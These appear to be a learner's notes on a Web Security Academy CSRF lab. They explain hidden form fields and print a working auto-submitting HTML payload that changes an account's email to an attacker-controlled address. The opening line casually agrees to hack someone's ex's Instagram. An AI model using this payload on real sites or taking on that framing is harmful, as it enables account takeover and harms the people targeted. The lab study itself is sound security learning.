# NOTES
Someone asked me to hack into their ex's Instagram. I told them sure thing I could use an X-Site-Request-Forgery. 

## LEARNINGS
- Learned how to CSRF exploit payload
- "hidden" : Parameter to hide an input field in a form. Devs used to have these to store data that couldn't be seen or changed by the users. *BURP*

### EXPLOIT 
- Payload was a simple HTML docco that created a new request to the vulnerable website, no barricades or encodings or tokens to face. 
- Web server Payload :

		404 : Not Found 
		<html>
		  <body>
		    <form action="ac551f441e3163cec054361900cb0070.web-security-academy.net/my-account/change-email=" method="GET">
		      <input type="hidden" name="email" value="pwned@evil-user.net" />
		    </form>
		    <script>
		      document.forms[0].submit();
		    </script>
		  </body>
		</html> 
![[Pasted image 20220126053548.png]]


